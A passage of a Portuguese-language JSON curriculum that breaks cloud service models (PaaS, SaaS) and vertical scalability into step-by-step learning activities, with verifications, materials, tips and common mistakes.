                                    "Instale CLI de uma plataforma (ex: Heroku CLI) e execute comandos básicos.",
                                    "Compare features em um quadro: Plataforma | Características Destacadas.",
                                    "Teste um deploy simulado ou tutorial hands-on."
                                  ],
                                  "verification": "Descreva 3 features de cada exemplo e como elas exemplificam PaaS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Heroku CLI e conta gratuita",
                                    "Azure free tier e portal",
                                    "Tutoriais: 'Deploy to Heroku in 5 min'"
                                  ],
                                  "tips": [
                                    "Comece com contas free para testes reais.",
                                    "Registre screenshots de dashboards de scaling."
                                  ],
                                  "learningObjective": "Associar características abstratas a plataformas reais.",
                                  "commonMistakes": [
                                    "Focar só em um exemplo, ignorando variações.",
                                    "Confundir features de PaaS com serverless (ex: AWS Lambda)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar PaaS de outros modelos e sintetizar aprendizado",
                                  "subSteps": [
                                    "Compare PaaS vs IaaS (ex: EC2): controle vs abstração.",
                                    "Compare PaaS vs SaaS (ex: Google Docs): código custom vs pronto.",
                                    "Crie um fluxograma de decisão: 'Quando usar PaaS?'.",
                                    "Resuma todas características em um mindmap.",
                                    "Discuta limitações do PaaS (vendor lock-in, custos em escala)."
                                  ],
                                  "verification": "Crie uma tabela de comparação PaaS/IaaS/SaaS com 4 colunas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas: Draw.io para fluxogramas",
                                    "Infográficos de comparação de nuvem (Gartner ou blogs)"
                                  ],
                                  "tips": [
                                    "Use matriz: Nível de Controle | Gerenciamento | Uso Ideal.",
                                    "Pense em casos de uso reais para fixar."
                                  ],
                                  "learningObjective": "Distinguir PaaS contextualizando suas características únicas.",
                                  "commonMistakes": [
                                    "Superestimar simplicidade (PaaS ainda requer otimizações).",
                                    "Ignorar evoluções como PaaS serverless."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma API simples em Node.js/Express, integre um banco PostgreSQL via add-on, e deploye no Heroku. Observe o auto-scaling automático ao simular tráfego com ferramentas como Loader.io, sem configurar servidores manualmente.",
                              "finalVerifications": [
                                "Listar e descrever 5+ características principais do PaaS com precisão.",
                                "Explicar como auto-scaling funciona em um exemplo real (Heroku ou Azure).",
                                "Diferenciar PaaS de IaaS e SaaS em uma tabela comparativa.",
                                "Identificar integrações comuns como DB e CI/CD em plataformas PaaS.",
                                "Discutir um benefício chave: aceleração de desenvolvimento com evidência.",
                                "Reconhecer limitações como vendor lock-in."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na lista de características (80% cobertura).",
                                "Uso de exemplos concretos e corretos de plataformas.",
                                "Clareza nas descrições e diferenciações entre modelos.",
                                "Profundidade nos sub-passos e verificações pessoais.",
                                "Criatividade em conexões práticas e real-world.",
                                "Ausência de erros comuns identificados."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Deploy de apps full-stack sem infra manual.",
                                "Administração de Sistemas: Conceitos de orquestração e scaling.",
                                "Gestão de Projetos: Redução de time-to-market com PaaS.",
                                "Economia Empresarial: Análise de custos vs benefícios em nuvem.",
                                "Segurança da Informação: Gerenciamento de patches e compliance no PaaS."
                              ],
                              "realWorldApplication": "Startups como Buffer usam Heroku para lançar produtos rapidamente, escalando de 100 para 1M usuários com auto-scaling automático, integrando DBs sem equipes de DevOps dedicadas, otimizando custos e foco em features."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.2.3",
                            "name": "Aplicar PaaS no desenvolvimento de aplicações para nuvem",
                            "description": "Demonstrar como PaaS otimiza o ciclo de vida de desenvolvimento de apps para internet, reduzindo configuração de servidores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos do PaaS e Selecionar Plataforma",
                                  "subSteps": [
                                    "Estude os conceitos chave de PaaS: abstração de infraestrutura, gerenciamento automático de servidores e escalabilidade.",
                                    "Compare plataformas PaaS populares como Heroku, Google App Engine e Azure App Service, considerando custo, linguagens suportadas e integrações.",
                                    "Defina requisitos da aplicação (ex: linguagem, banco de dados) e selecione a plataforma mais adequada.",
                                    "Crie uma conta gratuita na plataforma escolhida e explore a documentação oficial.",
                                    "Identifique como PaaS reduz configurações manuais comparado a IaaS."
                                  ],
                                  "verification": "Lista de prós e contras de pelo menos 3 plataformas PaaS documentada em um relatório curto.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial de Heroku/Google App Engine/Azure",
                                    "Notebook ou editor de texto"
                                  ],
                                  "tips": "Priorize plataformas com suporte à linguagem que você usa (ex: Node.js para Heroku).",
                                  "learningObjective": "Entender o valor único do PaaS no ciclo de desenvolvimento e escolher adequadamente.",
                                  "commonMistakes": [
                                    "Ignorar custos ocultos em tiers gratuitos",
                                    "Escolher plataforma sem suporte à stack tecnológica"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Desenvolvimento com PaaS",
                                  "subSteps": [
                                    "Instale CLI da plataforma (ex: Heroku CLI) e autentique com sua conta.",
                                    "Crie um repositório Git local para o projeto e inicialize com Procfile ou app.yaml conforme a plataforma.",
                                    "Configure variáveis de ambiente (ex: chaves de API, credenciais de DB) via dashboard ou CLI.",
                                    "Integre um banco de dados gerenciado (ex: Heroku Postgres) e teste conexão localmente.",
                                    "Execute deploy inicial de um 'Hello World' para validar setup."
                                  ],
                                  "verification": "Aplicação 'Hello World' deployada e acessível via URL pública da plataforma.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "CLI da plataforma instalada",
                                    "Git",
                                    "Editor de código (VS Code)"
                                  ],
                                  "tips": "Use 'git push heroku main' para deploy rápido; sempre commit antes.",
                                  "learningObjective": "Configurar ambiente pronto para desenvolvimento sem gerenciar servidores.",
                                  "commonMistakes": [
                                    "Esquecer de definir Procfile",
                                    "Não configurar variáveis de ambiente seguras"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver e Deployar Aplicação Completa",
                                  "subSteps": [
                                    "Desenvolva uma aplicação web simples (ex: API REST com Node.js e Express).",
                                    "Adicione features como autenticação e persistência de dados usando serviços PaaS.",
                                    "Teste localmente com 'heroku local' ou equivalente.",
                                    "Commit mudanças, push para o branch principal e monitore logs de deploy.",
                                    "Atualize a app com hotfixes e valide funcionalidade pós-deploy."
                                  ],
                                  "verification": "Aplicação completa rodando na nuvem com pelo menos 3 endpoints funcionais testados via Postman.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Node.js/linguagem escolhida",
                                    "Postman para testes",
                                    "Serviços DB do PaaS"
                                  ],
                                  "tips": "Use dynos ou instâncias escaláveis para testes de carga iniciais.",
                                  "learningObjective": "Aplicar PaaS para agilizar desenvolvimento e deploy contínuo.",
                                  "commonMistakes": [
                                    "Não versionar dependências corretamente",
                                    "Ignorar logs de erro durante deploy"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar, Escalar e Otimizar a Aplicação PaaS",
                                  "subSteps": [
                                    "Configure auto-scaling baseado em métricas de CPU/tráfego.",
                                    "Implemente monitoramento (ex: New Relic ou logs nativos) e defina alertas.",
                                    "Otimize performance removendo dependências desnecessárias e usando caching.",
                                    "Roteie tráfego com custom domains e SSL automático.",
                                    "Planeje rollback e migração para produção."
                                  ],
                                  "verification": "Relatório de métricas mostrando escalabilidade e aplicação otimizada sem downtime.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Dashboard da plataforma",
                                    "Ferramentas de monitoramento integradas"
                                  ],
                                  "tips": "Monitore uso de recursos para evitar surpresas em faturamento.",
                                  "learningObjective": "Gerenciar ciclo de vida completo de apps em PaaS de forma eficiente.",
                                  "commonMistakes": [
                                    "Sobrecarregar tiers gratuitos sem escalar",
                                    "Não habilitar SSL por padrão"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva e deploye uma API de gerenciamento de tarefas (ToDo List) usando Node.js no Heroku: inclua CRUD com MongoDB Atlas integrado, autenticação JWT e deploy em <10 minutos, acessível via https://minha-todo-app.herokuapp.com.",
                              "finalVerifications": [
                                "Aplicação deployada e pública sem configuração manual de servidores.",
                                "Auto-scaling configurado e testado com tráfego simulado.",
                                "Logs e métricas monitorados por 24h sem erros críticos.",
                                "Custom domain e SSL ativos.",
                                "Rollback bem-sucedido de uma mudança simulada.",
                                "Custo estimado mensal < R$50 em tier básico."
                              ],
                              "assessmentCriteria": [
                                "Tempo total de setup e deploy < 4 horas.",
                                "Zero downtime em deploys subsequentes.",
                                "Performance: resposta < 200ms em 95% das requisições.",
                                "Segurança: variáveis sensíveis não expostas no código.",
                                "Escalabilidade demonstrada com +100 usuários simultâneos.",
                                "Documentação completa do processo em README."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (GitHub Actions).",
                                "Segurança da Informação: Gerenciamento de segredos e compliance em nuvem.",
                                "Gestão de Projetos: Otimização de ciclos ágeis com deploys rápidos.",
                                "Banco de Dados: Uso de DBaaS integrados ao PaaS.",
                                "Redes: Configuração de load balancers e CDNs."
                              ],
                              "realWorldApplication": "Empresas como Shopify e GitHub usam PaaS (ex: Heroku) para deployar apps escaláveis rapidamente, permitindo foco em features em vez de infraestrutura, reduzindo time-to-market em 70% para startups."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.3",
                        "name": "Software as a Service (SaaS)",
                        "description": "Modelo de serviço em nuvem onde aplicações prontas são fornecidas via internet, acessíveis por navegador, sem necessidade de instalação local.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.3.1",
                            "name": "Definir SaaS",
                            "description": "Explicar a definição de SaaS, onde o provedor gerencia toda a stack, e usuários acessam funcionalidades sob demanda via assinatura.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos da Computação em Nuvem",
                                  "subSteps": [
                                    "Pesquise a definição básica de computação em nuvem: entrega de recursos de TI sob demanda via internet.",
                                    "Identifique os três principais modelos de serviço: IaaS (Infraestrutura), PaaS (Plataforma) e SaaS (Software).",
                                    "Leia um artigo introdutório sobre nuvem para contextualizar onde SaaS se encaixa.",
                                    "Anote as diferenças superficiais entre os modelos em um diagrama simples.",
                                    "Assista a um vídeo curto (5 min) explicando os modelos de nuvem."
                                  ],
                                  "verification": "Crie um diagrama ou mapa mental mostrando os três modelos e confirme se SaaS é mencionado como o mais alto nível.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Artigo introdutório sobre computação em nuvem (ex: AWS ou Wikipedia)",
                                    "Vídeo no YouTube sobre IaaS/PaaS/SaaS",
                                    "Papel e caneta ou ferramenta como Draw.io"
                                  ],
                                  "tips": "Comece pelo geral para evitar confusão; use analogias como alugar um carro completo (SaaS) vs. peças (IaaS).",
                                  "learningObjective": "Compreender o ecossistema da nuvem e posicionamento do SaaS.",
                                  "commonMistakes": [
                                    "Confundir SaaS com PaaS",
                                    "Ignorar o aspecto 'sob demanda' da nuvem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Definição Oficial de SaaS",
                                  "subSteps": [
                                    "Acesse definições de fontes confiáveis como NIST ou Gartner: SaaS é software entregue via internet, gerenciado pelo provedor.",
                                    "Destaque que o provedor gerencia toda a stack: infraestrutura, plataforma e aplicação.",
                                    "Note o modelo de acesso: via navegador ou app, sob demanda, via assinatura.",
                                    "Escreva a definição em suas próprias palavras, incluindo os elementos chave.",
                                    "Compare com definições de diferentes fontes para reforçar."
                                  ],
                                  "verification": "Escreva uma definição de SaaS com pelo menos 50 palavras e verifique se inclui gerenciamento da stack e assinatura.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentos NIST sobre nuvem (PDF gratuito)",
                                    "Site Gartner ou Forrester sobre SaaS",
                                    "Bloco de notas digital"
                                  ],
                                  "tips": "Use termos exatos primeiro, depois parafraseie para fixar.",
                                  "learningObjective": "Memorizar e articular a definição precisa de SaaS.",
                                  "commonMistakes": [
                                    "Omitir o gerenciamento total pela provedora",
                                    "Confundir assinatura com pagamento único"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Características e Benefícios do SaaS",
                                  "subSteps": [
                                    "Liste características chave: escalabilidade, atualizações automáticas, acessibilidade multi-dispositivo.",
                                    "Explique o modelo de precificação: pay-as-you-go ou assinatura mensal/anual.",
                                    "Discuta responsabilidades: usuário foca em dados, provedor em tudo mais (shared responsibility model).",
                                    "Identifique benefícios: custo reduzido, manutenção zero para usuário.",
                                    "Crie uma tabela comparando responsabilidades em SaaS vs. on-premise."
                                  ],
                                  "verification": "Preencha uma tabela de responsabilidades e liste 5 benefícios com explicações breves.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela em Excel/Google Sheets",
                                    "Infográfico sobre shared responsibility (ex: de Microsoft Azure)"
                                  ],
                                  "tips": "Pense em termos de 'quem faz o quê' para visualizar melhor.",
                                  "learningObjective": "Dominar as características operacionais e vantagens do SaaS.",
                                  "commonMistakes": [
                                    "Achar que usuário gerencia servidores em SaaS",
                                    "Ignorar riscos como dependência do provedor"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o Conceito com Exemplos e Comparações",
                                  "subSteps": [
                                    "Pesquise exemplos reais: Google Workspace, Salesforce, Netflix.",
                                    "Compare SaaS com PaaS (ex: Heroku) e IaaS (ex: AWS EC2).",
                                    "Simule um cenário: como uma empresa migra para SaaS.",
                                    "Debata prós e contras em um resumo curto.",
                                    "Crie um fluxograma de como um usuário acessa SaaS."
                                  ],
                                  "verification": "Liste 3 exemplos de SaaS com justificativa e um fluxograma simples.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Lista de ferramentas SaaS populares",
                                    "Ferramenta de fluxograma como Lucidchart free"
                                  ],
                                  "tips": "Escolha exemplos cotidianos para memorizar facilmente.",
                                  "learningObjective": "Conectar teoria à prática através de exemplos concretos.",
                                  "commonMistakes": [
                                    "Classificar erroneamente ferramentas (ex: Docker como SaaS)",
                                    "Não diferenciar acesso sob demanda"
                                  ]
                                }
                              ],
                              "practicalExample": "Imagine uma pequena empresa usando o Google Workspace (SaaS): eles acessam email, docs e storage via navegador, pagam assinatura mensal. O Google gerencia servidores, atualizações e segurança; a empresa só gerencia seus dados e usuários.",
                              "finalVerifications": [
                                "Explique SaaS em 1 minuto sem consultar notas.",
                                "Diferencie SaaS de IaaS e PaaS corretamente.",
                                "Liste 4 características chave do SaaS.",
                                "Identifique 3 exemplos reais de SaaS.",
                                "Descreva o modelo de responsabilidade no SaaS.",
                                "Crie uma definição escrita precisa."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição (gerenciamento total da stack pelo provedor).",
                                "Clareza na explicação do acesso sob demanda via assinatura.",
                                "Uso correto de terminologia (ex: multi-tenancy, escalabilidade).",
                                "Capacidade de diferenciar de outros modelos de nuvem.",
                                "Inclusão de exemplos relevantes e benefícios.",
                                "Compreensão do shared responsibility model."
                              ],
                              "crossCurricularConnections": [
                                "Negócios: Modelos de receita por assinatura e escalabilidade empresarial.",
                                "Desenvolvimento de Software: Abstração de infraestrutura para foco em código.",
                                "Gestão de TI: Estratégias de adoção de nuvem e redução de CAPEX.",
                                "Marketing Digital: Uso de ferramentas SaaS como HubSpot para automação."
                              ],
                              "realWorldApplication": "Empresas como startups usam SaaS (ex: Slack para comunicação, Zoom para reuniões) para lançar rapidamente sem investir em servidores, escalando globalmente com custos previsíveis e atualizações automáticas."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.3.2",
                            "name": "Identificar características do SaaS",
                            "description": "Listar características como multi-tenancy, atualizações automáticas, acessibilidade ubíqua e exemplos como Google Workspace ou Salesforce.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição e o modelo SaaS",
                                  "subSteps": [
                                    "Pesquise a definição oficial de SaaS de fontes confiáveis como AWS ou Gartner.",
                                    "Diferencie SaaS de outros modelos de nuvem (PaaS, IaaS).",
                                    "Identifique o papel do provedor vs. usuário no modelo SaaS.",
                                    "Anote os benefícios gerais como custo e escalabilidade.",
                                    "Crie um diagrama simples do fluxo SaaS (usuário -> nuvem -> dados compartilhados)."
                                  ],
                                  "verification": "Você pode explicar SaaS em suas próprias palavras e diferenciá-lo de PaaS/IaaS.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Artigo AWS: 'What is SaaS?' (https://aws.amazon.com/what-is/saas/)",
                                    "Vídeo YouTube: 'SaaS Explained' (5-10 min)",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use analogias como 'alugar um apartamento mobiliado' vs. 'construir uma casa'.",
                                  "learningObjective": "Entender o conceito fundamental de SaaS e sua posição nos modelos de nuvem.",
                                  "commonMistakes": [
                                    "Confundir SaaS com aplicações web genéricas.",
                                    "Ignorar a distinção entre hospedagem e SaaS."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e descrever características principais do SaaS",
                                  "subSteps": [
                                    "Liste as 5 características chave: multi-tenancy, atualizações automáticas, acessibilidade ubíqua, modelo de subscrição, escalabilidade gerenciada.",
                                    "Descreva cada uma em 1-2 frases, com foco em como funcionam tecnicamente.",
                                    "Pesquise evidências ou diagramas para cada característica.",
                                    "Crie uma tabela comparando SaaS tradicional vs. on-premise.",
                                    "Priorize características como multi-tenancy (isolamento lógico de tenants)."
                                  ],
                                  "verification": "Tabela completa com 5+ características descritas corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Salesforce: Características SaaS",
                                    "Infográfico Gartner sobre modelos de nuvem",
                                    "Ferramenta Google Sheets para tabela"
                                  ],
                                  "tips": "Lembre-se: multi-tenancy economiza recursos, mas requer isolamento de segurança.",
                                  "learningObjective": "Dominar as características técnicas e operacionais únicas do SaaS.",
                                  "commonMistakes": [
                                    "Omitir multi-tenancy como característica central.",
                                    "Confundir acessibilidade ubíqua com 'apenas mobile'."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar exemplos reais de produtos SaaS",
                                  "subSteps": [
                                    "Selecione 3 exemplos: Google Workspace, Salesforce, Dropbox.",
                                    "Para cada um, mapeie 3-4 características SaaS observadas.",
                                    "Acesse os sites oficiais e identifique menções a updates automáticos ou multi-tenancy.",
                                    "Registre screenshots ou notas de como acessar ubíquo (browser qualquer lugar).",
                                    "Compare como cada exemplo implementa subscrição e escalabilidade."
                                  ],
                                  "verification": "Relatório curto com mapeamento de características para cada exemplo.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Sites: workspace.google.com, salesforce.com, dropbox.com",
                                    "Navegador web",
                                    "Ferramenta de captura de tela"
                                  ],
                                  "tips": "Cadastre uma conta gratuita para experimentar acessibilidade.",
                                  "learningObjective": "Aplicar conceitos de características a produtos reais.",
                                  "commonMistakes": [
                                    "Escolher exemplos não-SaaS como apps desktop.",
                                    "Não mapear todas as características."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e praticar identificação de características",
                                  "subSteps": [
                                    "Crie uma lista consolidada de 6-8 características com definições e exemplos.",
                                    "Invente um cenário fictício e identifique se é SaaS baseado nas características.",
                                    "Responda a 5 perguntas de autoavaliação sobre as características.",
                                    "Discuta com um par ou anote potenciais contra-argumentos.",
                                    "Revise e refine sua lista final."
                                  ],
                                  "verification": "Lista final e respostas corretas às perguntas de autoavaliação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Modelo de quiz online (Quizlet ou papel)",
                                    "Lista de cenários fictícios preparados"
                                  ],
                                  "tips": "Use mnemônicos como 'MAUS' (Multi-tenancy, Atualizações, Ubíqua, Subscrição).",
                                  "learningObjective": "Consolidar conhecimento para identificação independente.",
                                  "commonMistakes": [
                                    "Generalizar demais sem exemplos específicos.",
                                    "Esquecer escalabilidade como característica implícita."
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o Google Workspace: Multi-tenancy permite múltiplas organizações no mesmo data center com isolamento; atualizações automáticas rolam sem downtime para usuários; acessibilidade ubíqua via browser em qualquer dispositivo; subscrição mensal por usuário; escalável adicionando seats instantaneamente.",
                              "finalVerifications": [
                                "Pode listar e explicar pelo menos 5 características principais do SaaS?",
                                "Identifica corretamente exemplos como Salesforce como SaaS vs. on-premise?",
                                "Explica multi-tenancy com isolamento lógico?",
                                "Descreve acessibilidade ubíqua sem necessidade de instalação?",
                                "Mapeia atualizações automáticas como responsabilidade do provedor?",
                                "Diferencia SaaS de PaaS/IaaS em um cenário?"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na lista de características (80% cobertura).",
                                "Qualidade das descrições: claras, técnicas e concisas.",
                                "Uso correto de exemplos reais com mapeamento explícito.",
                                "Profundidade em multi-tenancy e segurança associada.",
                                "Capacidade de aplicação em cenários novos ou fictícios.",
                                "Clareza na diferenciação de outros modelos de nuvem."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Negócios: Modelos de receita por subscrição e ROI de SaaS.",
                                "Segurança da Informação: Isolamento em multi-tenancy e compliance.",
                                "Desenvolvimento de Software: Arquitetura multi-tenant e DevOps.",
                                "Economia Digital: Impacto no mercado de TI e redução de CAPEX."
                              ],
                              "realWorldApplication": "Empresas como startups usam SaaS (ex: Salesforce para CRM) para lançar rapidamente sem investir em infraestrutura, permitindo foco no crescimento, escalabilidade global e atualizações contínuas sem equipe de TI dedicada."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.3.3",
                            "name": "Aplicar SaaS no desenvolvimento e integração de aplicações",
                            "description": "Discutir como desenvolvedores integram SaaS em aplicações para nuvem, aproveitando APIs para estender funcionalidades sem construir do zero.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Selecionar Serviços SaaS Adequados",
                                  "subSteps": [
                                    "Identifique o problema da aplicação que pode ser resolvido por SaaS (ex: pagamentos, autenticação, armazenamento).",
                                    "Liste 3-5 serviços SaaS populares para a funcionalidade desejada (ex: Stripe para pagamentos, Auth0 para autenticação).",
                                    "Compare características como pricing, escalabilidade, suporte a APIs e reviews de usuários.",
                                    "Avalie conformidade com requisitos de nuvem (ex: suporte a AWS, Azure).",
                                    "Selecione o SaaS ideal e crie uma conta de desenvolvedor gratuita."
                                  ],
                                  "verification": "Lista de SaaS comparados documentada e serviço selecionado com chave API obtida.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Navegador web",
                                    "Documentação de serviços SaaS (Stripe, Auth0, Twilio)",
                                    "Planilha para comparação"
                                  ],
                                  "tips": "Priorize serviços com SDKs para sua linguagem de programação (ex: Node.js, Python).",
                                  "learningObjective": "Compreender como mapear necessidades de app a soluções SaaS prontas.",
                                  "commonMistakes": [
                                    "Escolher SaaS sem verificar custos ocultos",
                                    "Ignorar limitações regionais ou de latência"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Documentação da API do SaaS Selecionado",
                                  "subSteps": [
                                    "Acesse a seção de desenvolvedores do SaaS e leia a visão geral da API.",
                                    "Estude endpoints principais, métodos HTTP (GET, POST) e payloads de exemplo.",
                                    "Configure autenticação (API keys, OAuth2) e teste chamadas básicas via Postman ou curl.",
                                    "Identifique rate limits, erros comuns e webhooks para eventos assíncronos.",
                                    "Mapeie como a API se integra ao fluxo da sua aplicação."
                                  ],
                                  "verification": "Chamadas de teste bem-sucedidas no Postman com respostas JSON válidas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "Documentação oficial da API do SaaS",
                                    "Chave API de desenvolvedor"
                                  ],
                                  "tips": "Use ferramentas como Swagger para visualizar endpoints interativamente.",
                                  "learningObjective": "Dominar a estrutura e uso da API SaaS para integração eficiente.",
                                  "commonMistakes": [
                                    "Não testar autenticação cedo",
                                    "Ignorar rate limits levando a bloqueios"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar a Integração na Aplicação",
                                  "subSteps": [
                                    "Instale SDK ou biblioteca oficial do SaaS (ex: npm install stripe).",
                                    "Crie funções wrapper para chamadas API no código da app (ex: createPaymentIntent).",
                                    "Integre no frontend/backend conforme arquitetura (ex: chamada async no React).",
                                    "Gerencie erros com try-catch e logs para depuração.",
                                    "Configure variáveis de ambiente para chaves sensíveis."
                                  ],
                                  "verification": "Aplicação executa funcionalidade SaaS localmente sem erros de compilação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "IDE (VS Code)",
                                    "Repositório Git da aplicação",
                                    "SDK do SaaS",
                                    ".env para secrets"
                                  ],
                                  "tips": "Use async/await para chamadas API para evitar bloqueios.",
                                  "learningObjective": "Aplicar práticas de integração segura e modular de APIs SaaS.",
                                  "commonMistakes": [
                                    "Expor chaves API no código fonte",
                                    "Não sanitizar inputs em payloads"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Deployar e Monitorar a Integração",
                                  "subSteps": [
                                    "Escreva testes unitários para funções de integração (ex: Jest para Node.js).",
                                    "Teste end-to-end em ambiente staging com dados reais simulados.",
                                    "Deploy na nuvem (ex: Vercel, Heroku) e verifique logs de integração.",
                                    "Configure monitoramento (ex: webhooks para falhas, métricas de uso).",
                                    "Otimize performance medindo latência das chamadas API."
                                  ],
                                  "verification": "Testes passam 100% e app deployada funciona em produção simulada.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de teste (Jest, Cypress)",
                                    "Plataforma de deploy (Vercel)",
                                    "Ferramentas de log (Console, Sentry)"
                                  ],
                                  "tips": "Simule cenários de falha como timeouts para robustez.",
                                  "learningObjective": "Garantir que a integração SaaS seja confiável e escalável em produção.",
                                  "commonMistakes": [
                                    "Pular testes em staging",
                                    "Não configurar alertas para downtime do SaaS"
                                  ]
                                }
                              ],
                              "practicalExample": "Integre o Stripe SaaS em uma aplicação e-commerce Node.js/React: crie checkout de pagamentos, gerencie webhooks para confirmações e exiba histórico de transações sem codificar um gateway de pagamento do zero.",
                              "finalVerifications": [
                                "Aplicação integra SaaS via API com autenticação segura.",
                                "Chamadas API respondem corretamente em testes end-to-end.",
                                "Deploy na nuvem sem erros de integração.",
                                "Logs mostram tráfego API sem rate limits excedidos.",
                                "Dados sensíveis não expostos em repositório.",
                                "Performance: latência < 500ms por chamada."
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções wrapper claras (80% cobertura de testes).",
                                "Uso correto de autenticação e gerenciamento de erros.",
                                "Integração segue melhores práticas (env vars, async handling).",
                                "Documentação de setup e troubleshooting incluída.",
                                "Escalabilidade demonstrada (ex: múltiplas chamadas simultâneas).",
                                "Otimização de custos SaaS evidenciada."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Autenticação OAuth e proteção de dados.",
                                "DevOps: CI/CD para deploys com integrações SaaS.",
                                "Gestão de Projetos: Avaliação de ROI de SaaS vs. desenvolvimento próprio.",
                                "Análise de Dados: Monitoramento de métricas de uso da API.",
                                "Negócios: Impacto em modelos de receita (ex: pagamentos recorrentes)."
                              ],
                              "realWorldApplication": "Empresas como Netflix integram SaaS como Stripe para pagamentos globais, Auth0 para login social e SendGrid para emails transacionais, reduzindo tempo de desenvolvimento em 70% e focando em features core."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.2",
                    "name": "Princípios de Escalabilidade",
                    "description": "Técnicas de escalabilidade horizontal e vertical em plataformas de nuvem.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.2.1",
                        "name": "Escalabilidade Vertical",
                        "description": "Técnica de escalabilidade que consiste no aumento dos recursos computacionais (CPU, memória, disco) em uma única instância ou máquina virtual, permitindo que a aplicação suporte maior carga sem downtime, comum em plataformas de nuvem como AWS EC2 ou Azure VMs.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.1.1",
                            "name": "Identificar cenários adequados para escalabilidade vertical",
                            "description": "Reconhecer situações em que o upgrade de hardware em uma única instância é viável, como aplicações com estado persistente ou workloads que não se beneficiam de distribuição, considerando limites de hardware máximo em nuvens.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos da escalabilidade vertical versus horizontal",
                                  "subSteps": [
                                    "Defina escalabilidade vertical como o upgrade de recursos (CPU, RAM, disco) em uma única instância.",
                                    "Compare com escalabilidade horizontal, que envolve adicionar mais instâncias e distribuir carga.",
                                    "Estude limites típicos de instâncias em nuvens como AWS (ex: EC2 r6i.48xlarge com 192 vCPUs).",
                                    "Analise quando vertical é preferível: simplicidade e custo menor para workloads não distribuíveis.",
                                    "Revise diagramas de arquitetura monolítica vs distribuída."
                                  ],
                                  "verification": "Crie um diagrama comparando vertical e horizontal scaling, explicando prós e contras.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação AWS EC2 instance types",
                                    "Artigo 'Vertical vs Horizontal Scaling' no Martin Fowler blog",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
